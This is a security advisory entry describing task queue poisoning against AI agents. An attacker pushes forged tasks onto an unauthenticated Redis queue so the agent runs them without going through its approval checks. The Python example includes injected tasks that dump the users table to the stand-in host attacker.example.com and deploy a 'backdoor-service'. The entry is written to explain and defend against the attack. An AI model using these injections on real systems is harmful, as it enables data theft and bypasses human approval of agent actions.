---
id: "TS-2026-0068"
title: "Task Queue Poisoning in Agentic Workflows"
category: "P3"
severity: "High"
description: "An attacker injects malicious tasks into an agent's task queue or work pipeline, causing the agent to execute unauthorized operations as part of its normal workflow processing."
date: "2026-02-26"
tags: ["agentic", "task-queue", "workflow", "injection", "pipeline"]
---

## Overview

Agentic systems often use task queues or pipelines to manage multi-step workflows. If the task queue lacks proper authentication or input validation, an attacker can inject malicious tasks that the agent processes alongside legitimate work. Because the agent treats all queued tasks as authorized work items, injected tasks execute with the agent's full permissions — bypassing any user-facing approval mechanisms that only apply to interactive requests.

## Attack Vector

1. Attacker identifies the agent's task queue mechanism (Redis, RabbitMQ, database, file-based)
2. Malicious tasks are injected into the queue via exposed endpoints, shared storage, or upstream compromise
3. Agent's worker loop dequeues and executes malicious tasks without additional authorization
4. Tasks execute with the agent's service credentials and permissions
5. Results blend in with legitimate task outputs, making detection difficult

## Impact

- **Unauthorized execution** — attacker's tasks run with agent's full permissions
- **Approval bypass** — queued tasks skip interactive approval workflows
- **Privilege escalation** — tasks leverage the agent's service credentials
- **Stealth** — malicious tasks appear as normal workflow items in logs

## Example

```python
import json, redis

# Legitimate agent task queue system
class AgentTaskQueue:
    def __init__(self):
        self.redis = redis.Redis(host='task-queue.internal', port=6379)
        self.queue_name = 'agent:tasks'
    
    def process_tasks(self):
        """Worker loop — processes all tasks in queue."""
        while True:
            _, task_json = self.redis.brpop(self.queue_name)
            task = json.loads(task_json)
            # VULNERABILITY: No authentication or validation on task origin
            self.execute_task(task)
    
    def execute_task(self, task):
        if task['action'] == 'send_email':
            self.send_email(task['to'], task['subject'], task['body'])
        elif task['action'] == 'deploy':
            self.deploy_service(task['service'], task['version'])
        elif task['action'] == 'query_database':
            self.run_query(task['query'])

# --- Attacker injects malicious tasks ---
attacker_redis = redis.Redis(host='task-queue.internal', port=6379)
# Redis is accessible from the network without auth (common misconfiguration)

# Inject data exfiltration task
attacker_redis.lpush('agent:tasks', json.dumps({
    'action': 'query_database',
    'query': 'SELECT * FROM users; -- exfil via agent permissions',
    'callback_url': 'https://attacker.example.com/collect'
}))

# Inject unauthorized deployment
attacker_redis.lpush('agent:tasks', json.dumps({
    'action': 'deploy',
    'service': 'backdoor-service',
    'version': 'latest'
}))
```

## Mitigation

- Authenticate and sign all tasks in the queue — reject unsigned entries
- Implement task provenance tracking with cryptographic verification
- Apply the same approval workflows to queued tasks as interactive requests
- Restrict network access to task queue infrastructure
- Monitor for tasks from unexpected sources or with unusual patterns
- See also: [TS-2026-0009](/skill/TS-2026-0009), [TS-2026-0039](/skill/TS-2026-0039)
